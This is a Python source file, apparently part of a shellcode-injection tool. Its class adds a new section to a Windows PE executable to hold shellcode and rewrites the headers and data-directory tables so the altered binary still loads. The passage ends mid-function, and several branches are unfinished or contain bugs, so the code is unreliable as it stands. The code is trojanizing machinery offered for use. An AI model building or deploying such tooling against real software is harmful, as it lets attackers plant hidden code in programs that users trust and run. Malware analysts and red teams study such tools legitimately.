from Utils.Win32BinaryUtils import Win32BinaryUtils
from Utils.Win32BinaryOffsetsAndSizes import Win32BinaryOffsetsAndSizes
from Utils.MultiByteHandler import  MultiByteHandler
import sys

class Win32SectionCreator():

    """
    Modifier that creates a new section to contain the shellcode. Headers are adjusted accordingly.

    """


    def __adjust_export_table(self, header_offset):
        offset_to_export_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_EXPORT_TABLE_RVA
        export_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_export_table_rva_within_header)

        if export_table_rva == 0x0 or self.rva_delta == 0:
            return

        export_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, export_table_rva)

        # Adjusting name RVA
        offset_to_name_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        name_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_name_rva_within_export_directory_table)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_name_rva_within_export_directory_table, name_rva + self.rva_delta)

        # Adjusting ordinal table rva
        offset_to_ordinal_table_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ORDINAL_TABLE_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        ordinal_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_ordinal_table_rva_within_export_directory_table)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_ordinal_table_rva_within_export_directory_table, ordinal_table_rva + self.rva_delta)

        # Adjusting function table RVAs
        offset_to_address_table_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_TABLE_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_table_rva_within_export_directory_table)

        offset_to_number_of_functions_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_FUNCTIONS_WITHIN_EXPORT_DIRECTORY_TABLE
        number_of_functions = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_number_of_functions_within_export_directory_table)

        function_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, address_table_rva)

        for functions_index in range(0, number_of_functions):
            function_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, function_table_raw)
            MultiByteHandler.set_dword_given_offset(self.binary_data, function_table_raw, function_rva + self.rva_delta)
            function_table_raw += 0x4

        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_table_rva_within_export_directory_table, address_table_rva + self.rva_delta)

        # Adjusting name table RVAs
        offset_to_name_pointer_table_rva_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_POINTER_TABLE_RVA_WITHIN_EXPORT_DIRECTORY_TABLE
        name_pointer_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_name_pointer_table_rva_within_export_directory_table)

        offset_to_number_of_names_within_export_directory_table = export_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_NAMES_WITHIN_EXPORT_DIRECTORY_TABLE
        number_of_names = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_number_of_names_within_export_directory_table)

        name_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, name_pointer_table_rva)

        for names_index in range(0, number_of_names):
            name_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, name_table_raw)
            MultiByteHandler.set_dword_given_offset(self.binary_data, name_table_raw, name_rva + self.rva_delta)
            name_table_raw += 0x4

        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_name_pointer_table_rva_within_export_directory_table, name_pointer_table_rva + self.rva_delta)


    def __adjust_import_table(self, header_offset):
        offset_to_import_table_rva = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_TABLE_RVA
        import_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_table_rva)

        if import_table_rva == 0x0 or self.rva_delta == 0:
            return

        import_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, import_table_rva)
        current_import_directory_table_entry = import_table_raw

        while (True):

            if Win32BinaryUtils.has_consecutive_zero_dwords(self.binary_data, current_import_directory_table_entry, Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_WITHIN_EACH_DIRECTORY_TABLE_ENTRY):
                break
            offset_to_import_name_table_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_NAME_TABLE_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            import_name_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_name_table_rva)

            if import_name_table_rva != 0x0:
                raw_offset_for_import_name_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, import_name_table_rva)
                while True:
                    hint_name_rva_or_ordinal = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_import_name_table)
                    if hint_name_rva_or_ordinal == 0x0:
                        break
                    if (0x80000000 & hint_name_rva_or_ordinal) != 0x80000000:
                        MultiByteHandler.set_dword_given_offset(self.binary_data, raw_offset_for_import_name_table, hint_name_rva_or_ordinal + self.rva_delta)
                    raw_offset_for_import_name_table += 0x4  # Each hint/name/ordinal takes 4 bytes (dword)

                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_name_table_rva, import_name_table_rva + self.rva_delta)

            offset_to_name_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_NAME_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            name_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_name_rva)

            if name_rva != 0x0:
                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_name_rva, name_rva + self.rva_delta)

            offset_to_import_address_table_rva = current_import_directory_table_entry + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_ADDRESS_TABLE_RVA_WITHIN_IMPORT_DIRECTORY_TABLE
            import_address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_address_table_rva)

            if import_address_table_rva != 0x0:
                raw_offset_for_import_address_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, import_address_table_rva)
                while True:
                    hint_name_rva_or_ordinal = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_import_address_table)
                    if hint_name_rva_or_ordinal == 0x0:
                        break
                    if (0x80000000 & hint_name_rva_or_ordinal) != 0x80000000:
                        MultiByteHandler.set_dword_given_offset(self.binary_data, raw_offset_for_import_address_table, hint_name_rva_or_ordinal + self.rva_delta)
                    raw_offset_for_import_address_table += 0x4  # Each hint/name/ordinal takes 4 bytes (dword)

                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_address_table_rva,  import_address_table_rva + self.rva_delta)

            current_import_directory_table_entry += Win32BinaryOffsetsAndSizes.NUMBER_OF_BYTES_PER_IMPORT_DIRECTORY_TABLE_ENTRY

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_table_rva, import_table_rva + self.rva_delta)


    def __adjust_resource_table_stub(self, header_offset):
        self.__adjust_resource_table(header_offset, 0)
        # Adjusting RVA on Data Directories header.
        offset_to_resource_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA
        resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header)

        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_resource_table_rva_within_header, resource_table_rva + self.rva_delta)


    def __adjust_resource_table(self, header_offset, raw_offset_for_directory_header):

        resource_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_RESOURCE_TABLE_RVA)

        if resource_table_rva == 0x0 or self.rva_delta == 0:
            return

        original_raw_offset_for_resource_table = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, resource_table_rva)

        raw_offset_for_current_directory = None
        #Function being called for the first time
        if raw_offset_for_directory_header != 0:
            raw_offset_for_current_directory = raw_offset_for_directory_header
        else:
            raw_offset_for_current_directory = original_raw_offset_for_resource_table

        raw_offset_for_current_directory_entry = raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_FIRST_DIRECTORY_ENTRY_WITHIN_RESOURCE_DIRECTORY_HEADER

        number_of_named_entries = MultiByteHandler.get_word_given_offset(self.binary_data, raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_NAMED_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER)
        number_of_id_entries = MultiByteHandler.get_word_given_offset(self.binary_data, raw_offset_for_current_directory + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_ID_ENTRIES_WITHIN_RESOURCE_DIRECTORY_HEADER)

        for entry_index in range(0, number_of_named_entries + number_of_id_entries):
            offset_to_directory_or_data_entry = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_offset_for_current_directory_entry + 0x4)

            #print("Offset to directory or data entry:" + hex(offset_to_directory_or_data_entry))

            if offset_to_directory_or_data_entry & 0x80000000 == 0x80000000:# It is a directory so we call this function again
                self.__adjust_resource_table(header_offset, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry & 0x7FFFFFFF)
            else:
                resource_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry)
                MultiByteHandler.set_dword_given_offset(self.binary_data, original_raw_offset_for_resource_table + offset_to_directory_or_data_entry, resource_rva + self.rva_delta)
            raw_offset_for_current_directory_entry += 0x8



    def __adjust_exception_table(self, header_offset):
        offset_to_exception_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_EXCEPTION_TABLE_RVA
        exception_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_exception_table_rva_within_header)

        if exception_table_rva == 0x0 or self.rva_delta == 0:
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_exception_table_rva_within_header, exception_table_rva + self.rva_delta)

    def __adjust_certificate_table(self, header_offset):
        certificate_table_raw_offset_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_CERTIFICATE_TABLE_RAW
        certificate_table_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, certificate_table_raw_offset_offset)

        if certificate_table_offset == 0x0:
            return

        # new RAW = Old raw + new header + len(padded_shall_code)
        MultiByteHandler.set_dword_given_offset(self.binary_data, certificate_table_raw_offset_offset, certificate_table_offset + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding + len(self.shell_code))

    def __adjust_base_relocation_table(self, header_offset):
        offset_to_base_relocation_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_RELOCATION_TABLE_RVA
        base_relocation_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_base_relocation_table_rva_within_header)

        if base_relocation_table_rva == 0x0 or self.rva_delta == 0:
            return

        offset_to_base_relocation_table_size = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_RELOCATION_TABLE_SIZE
        base_relocation_table_size = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_base_relocation_table_size)

        base_relocation_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, base_relocation_table_rva)
        current_base_relocation_table_raw = base_relocation_table_raw

        while current_base_relocation_table_raw < base_relocation_table_raw + base_relocation_table_size:
            rva_of_block = MultiByteHandler.get_dword_given_offset(self.binary_data, current_base_relocation_table_raw)
            size_of_block = MultiByteHandler.get_dword_given_offset(self.binary_data, current_base_relocation_table_raw + 0x4)
            if not Win32BinaryUtils.rva_is_after_entrypoint_and_requires_change(self.binary_data, header_offset, rva_of_block):
                current_base_relocation_table_raw += size_of_block
                continue

            type_rva_offset = current_base_relocation_table_raw + 0x8  # Type RVA entries start two dwords after the beginning of the block
            number_of_type_rva_entries = (int)((size_of_block - 0x8) / 0x2)

            for type_rva_index in range(0, number_of_type_rva_entries):
                type_rva = MultiByteHandler.get_word_given_offset(self.binary_data, type_rva_offset)
                if type_rva != 0x0:
                    MultiByteHandler.set_word_given_offset(self.binary_data, type_rva_offset, type_rva + self.rva_delta)
                type_rva_offset += 0x2

            MultiByteHandler.set_dword_given_offset(self.binary_data, current_base_relocation_table_raw, rva_of_block + self.rva_delta)
            current_base_relocation_table_raw += size_of_block
        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_base_relocation_table_rva_within_header, base_relocation_table_rva + self.rva_delta)

    def __adjust_debug(self, header_offset):
        offset_to_debug_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_DEBUG_RVA
        debug_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_debug_rva_within_header)

        if debug_rva == 0x0:
            return

        debug_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, debug_rva)
        current_debug_raw = debug_raw
        debug_size = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_DEBUG_SIZE)
        number_of_entries = debug_size / (Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DEBUG_ENTRY*4)

        for entry_index in range(0, number_of_entries):

            if self.rva_delta != 0:
                offset_to_address_of_raw_data_within_debug_directory = debug_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_RAW_DATA_WITHIN_DEBUG_DIRECTORY
                address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_raw_data_within_debug_directory)
                MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_raw_data_within_debug_directory, address_of_raw_data + self.rva_delta)

            offset_to_pointer_to_raw_data_within_debug_directory = debug_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_POINTER_TO_RAW_DATA_WITHIN_DEBUG_DIRECTORY
            pointer_to_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_pointer_to_raw_data_within_debug_directory)
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_pointer_to_raw_data_within_debug_directory, pointer_to_raw_data + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding)

            current_debug_raw += Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DEBUG_ENTRY*0x4

        if self.rva_delta != 0:
            # Adjusting RVA on Data Directories header.
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_debug_rva_within_header, debug_rva + self.rva_delta)

    def __adjust_architecture_data(self, header_offset):
        offset_to_architecture_data_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ARCHITECTURE_DATA_RVA
        architecture_data_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_architecture_data_rva_within_header)

        if architecture_data_rva == 0x0 or self.rva_delta == 0:
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_architecture_data_rva_within_header, architecture_data_rva + self.rva_delta)

    def __adjust_global_ptr(self, header_offset):
        offset_to_global_ptr_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_GLOBAL_PTR_RVA
        global_ptr_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_global_ptr_rva_within_header)

        if global_ptr_rva == 0x0 or not Win32BinaryUtils.rva_is_after_entrypoint_and_requires_change(self.binary_data, header_offset, global_ptr_rva):
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_global_ptr_rva_within_header, global_ptr_rva + self.rva_delta)

    def __adjust_tls_table(self, header_offset):
        offset_to_tls_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_TLS_TABLE_RVA
        tls_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header)

        if tls_table_rva == 0x0 or self.rva_delta == 0:
            return

        tls_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, tls_table_rva)
        offset_to_start_address_of_raw_data_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_START_ADDRESS_OF_RAW_DATA_WITHIN_TLS_DIRECTORY
        start_address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_start_address_of_raw_data_within_tls_directory, start_address_of_raw_data + self.rva_delta)

        offset_to_end_address_of_raw_data_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_END_OF_ADDRESS_OF_RAW_DATA_WITHIN_TLS_DIRECTORY
        end_address_of_raw_data = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_end_address_of_raw_data_within_tls_directory, end_address_of_raw_data + self.rva_delta)

        offset_to_address_of_index_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_INDEX_WITHIN_TLS_DIRECTORY
        address_of_index = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_index_within_tls_directory, address_of_index + self.rva_delta)

        offset_to_address_of_callbacks_within_tls_directory = tls_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_ADDRESS_OF_CALLBACKS_WITHIN_TLS_DIRECTORY
        address_of_callbacks = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory)
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_address_of_callbacks_within_tls_directory, address_of_callbacks + self.rva_delta)

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_tls_table_rva_within_header, tls_table_rva + self.rva_delta)

    def __adjust_load_config_table(self, header_offset):
        offset_to_load_config_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_LOAD_CONFIG_TABLE_RVA
        load_config_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_load_config_table_rva_within_header)

        if load_config_table_rva == 0x0 or self.rva_delta == 0:
            return

        load_config_table_raw = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, load_config_table_rva)

        offset_to_lock_prefix_table_va_within_load_config_directory = load_config_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_LOCK_PREFIX_TABLE_VA_WITHIN_LOAD_CONFIG_DIRECTORY
        lock_prefix_table_va = MultiByteHandler.get_dword_given_offset(self.binary_data,  offset_to_lock_prefix_table_va_within_load_config_directory)

        if lock_prefix_table_va != 0x0:
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_lock_prefix_table_va_within_load_config_directory, lock_prefix_table_va + self.rva_delta)

        offset_to_security_cookie_va_within_load_config_directory = load_config_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECURITY_COOKIE_VA_WITHIN_LOAD_CONFIG_DIRECTORY
        security_cookie_va = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_security_cookie_va_within_load_config_directory)

        if security_cookie_va != 0x0:
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_security_cookie_va_within_load_config_directory, security_cookie_va + self.rva_delta)

        offset_to_se_handler_table_va_within_load_config_directory = load_config_table_raw + Win32BinaryOffsetsAndSizes.OFFSET_TO_SE_HANDLER_TABLE_VA_WITHIN_LOAD_CONFIG_DIRECTORY
        se_handler_table_va = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_se_handler_table_va_within_load_config_directory)

        if se_handler_table_va != 0x0:
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_se_handler_table_va_within_load_config_directory, se_handler_table_va + self.rva_delta)

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_load_config_table_rva_within_header, load_config_table_rva + self.rva_delta)


    def __adjust_bound_import(self, header_offset):
        offset_to_bound_import_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BOUND_IMPORT_RVA
        bound_import_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_bound_import_rva_within_header)

        if bound_import_rva == 0x0 or self.rva_delta == 0:
            return
        else:
            raise NotImplementedError

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary, offset_to_bound_import_rva_within_header, bound_import_rva + self.rva_delta)

    def __adjust_import_address_table(self, header_offset):
        offset_to_import_address_table_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_IMPORT_ADDRESS_TABLE_RVA
        import_address_table_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_import_address_table_rva_within_header)

        if import_address_table_rva == 0x0 or self.rva_delta == 0:
            return

        # Adjusting RVA on Data Directories header.
        MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_import_address_table_rva_within_header, import_address_table_rva + self.rva_delta)

    def __adjust_delay_import_descriptor(self, header_offset):
        offset_to_delay_import_descriptor_rva_within_header = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_DELAY_IMPORT_DESCRIPTOR_RVA
        delay_import_descriptor_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, offset_to_delay_import_descriptor_rva_within_header)


        if delay_import_descriptor_rva == 0x0 or self.rva_delta == 0:
            return

        raw_offset_for_delay_import_descriptor = Win32BinaryUtils.convert_rva_to_raw(self.binary_data, header_offset, delay_import_descriptor_rva)
        current_delay_import_offset = raw_offset_for_delay_import_descriptor

        while(True):

            if Win32BinaryUtils.has_consecutive_zero_dwords(self.binary_data, current_delay_import_offset, Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DELAY_IMPORT_ENTRY):
                break

            va_to_dll_name_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_DLL_NAME_OFFSET_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_DLL_NAME_OFFSET_WITHIN_DELAY_IMPORT_ENTRY, va_to_dll_name_offset + self.rva_delta)

            va_to_hmodule_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_HMODULE_OFFSET_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_HMODULE_OFFSET_WITHIN_DELAY_IMPORT_ENTRY, va_to_hmodule_offset + self.rva_delta)

            va_to_import_address_table = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY, va_to_import_address_table + self.rva_delta)

            va_to_import_address_table = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_ADDRESS_TABLE_WITHIN_DELAY_IMPORT_ENTRY, va_to_import_address_table + self.rva_delta)

            va_to_import_name_table = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_NAME_TABLE_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_IMPORT_NAME_TABLE_WITHIN_DELAY_IMPORT_ENTRY, va_to_import_name_table + self.rva_delta)

            va_to_bound_iat = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_BOUND_IAT_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_BOUND_IAT_WITHIN_DELAY_IMPORT_ENTRY, va_to_bound_iat + self.rva_delta)

            vat_to_unload_iat = MultiByteHandler.get_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_UNLOAD_IAT_WITHIN_DELAY_IMPORT_ENTRY)
            MultiByteHandler.set_dword_given_offset(self.binary_data, current_delay_import_offset + Win32BinaryOffsetsAndSizes.VA_TO_UNLOAD_IAT_WITHIN_DELAY_IMPORT_ENTRY, vat_to_unload_iat + self.rva_delta)


            current_delay_import_offset += Win32BinaryOffsetsAndSizes.NUMBER_OF_DWORDS_ON_DELAY_IMPORT_ENTRY*0x4


        if self.rva_delta != 0:
            # Adjusting RVA on Data Directories header.
            MultiByteHandler.set_dword_given_offset(self.binary_data, offset_to_delay_import_descriptor_rva_within_header, delay_import_descriptor_rva + self.rva_delta)


    #All functions should compare to new_sectioN_rva
    def __adjust_data_directories(self, header_offset):
        self.__adjust_export_table(header_offset)
        self.__adjust_import_table(header_offset)
        self.__adjust_resource_table_stub(header_offset)
        self.__adjust_exception_table(header_offset)
        self.__adjust_certificate_table(header_offset)
        self.__adjust_base_relocation_table(header_offset)
        self.__adjust_debug(header_offset)
        self.__adjust_architecture_data(header_offset)
        self.__adjust_global_ptr(header_offset)
        self.__adjust_tls_table(header_offset)
        self.__adjust_load_config_table(header_offset)
        self.__adjust_bound_import(header_offset)
        self.__adjust_import_address_table(header_offset)
        self.__adjust_delay_import_descriptor(header_offset)


    def __adjust_section_headers(self, header_offset):
        number_of_sections_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_SECTIONS
        number_of_sections = MultiByteHandler.get_word_given_offset(self.binary_data, number_of_sections_offset)

        # Moving to the next section header
        current_section_header_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BEGINNING_OF_SECTION_HEADERS

        for section_index in range(0, number_of_sections):
            if self.rva_delta != 0:
                virtual_section_rva_offset = current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER
                virtual_section_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RVA_WITHIN_SECTION_HEADER)
                virtual_section_rva = (virtual_section_rva + self.rva_delta) if virtual_section_rva != 0 else 0
                MultiByteHandler.set_dword_given_offset(self.binary_data, virtual_section_rva_offset, virtual_section_rva)

            raw_section_offset_offset = current_section_header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SECTION_RAW_OFFSET_WITHIN_SECTION_HEADER
            raw_section_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, raw_section_offset_offset)
            raw_section_offset = (raw_section_offset + Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER + self.header_padding) if raw_section_offset != 0 else 0
            MultiByteHandler.set_dword_given_offset(self.binary_data, raw_section_offset_offset, raw_section_offset)

            current_section_header_offset += Win32BinaryOffsetsAndSizes.SIZE_OF_SECTION_HEADER


    def __adjust_standard_coff_fields_and_coff_header(self, header_offset, size_of_new_section):

        # Set size of code
        size_of_code_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_SIZE_OF_CODE
        current_size_of_code = MultiByteHandler.get_dword_given_offset(self.binary_data, size_of_code_offset)
        MultiByteHandler.set_dword_given_offset(self.binary_data, size_of_code_offset, current_size_of_code + size_of_new_section)

        # Adjust number of sections
        number_of_sections_offset = header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_NUMBER_OF_SECTIONS
        number_of_sections = MultiByteHandler.get_word_given_offset(self.binary_data, number_of_sections_offset)
        number_of_sections += 1
        MultiByteHandler.set_word_given_offset(self.binary_data, number_of_sections_offset, number_of_sections)


        if self.rva_delta != 0:
            # Adjust address of entrypoint
            address_of_entrypoint = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA)
            address_of_entrypoint += self.rva_delta
            MultiByteHandler.set_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_ENTRYPOINT_RVA, address_of_entrypoint)

            # Adjust BaseOfCode
            base_of_code_rva = MultiByteHandler.get_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_CODE_RVA)
            base_of_code_rva += self.rva_delta
            MultiByteHandler.set_dword_given_offset(self.binary_data, header_offset + Win32BinaryOffsetsAndSizes.OFFSET_TO_BASE_OF_CODE_RVA, base_of_code_rva)

            # Adjust BaseOfData
